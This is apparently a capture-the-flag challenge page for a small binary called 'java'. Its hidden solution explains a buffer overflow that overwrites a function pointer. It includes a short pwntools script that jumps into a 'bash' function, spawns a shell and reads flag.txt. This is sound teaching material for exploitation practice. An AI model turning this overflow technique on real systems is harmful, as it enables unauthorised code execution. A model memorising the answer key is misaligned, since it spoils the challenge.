# Java
### 📄 Description
Comparing strings in assembly is an hard task for java n00bs.

### ⚙ How to run it
```bash
./java
```

### ⛔ Rules
Don't open the `flag.txt` file.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>
    
By looking at the source we can see that there's a struct containing a string followed by a function pointer, if we can somehow overflow the string buffer we can jump to an arbitrary location. One interesting destination might be the last line of the `bash` function which happens to have an offset of `0x32` from the start of the function. The user input handling doesn't check string bounds so we can easily overflow the buffer and pop a shell.

```python
from pwn import *

context.binary = "./java"

p = process()
p.sendline(b"java" + b"A" * 28 + p64(context.binary.functions["bash"].address + 0x32))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

<h3> 🚩 Flag </h3>

```plain
flag{this_is_a_flag}
```
</details>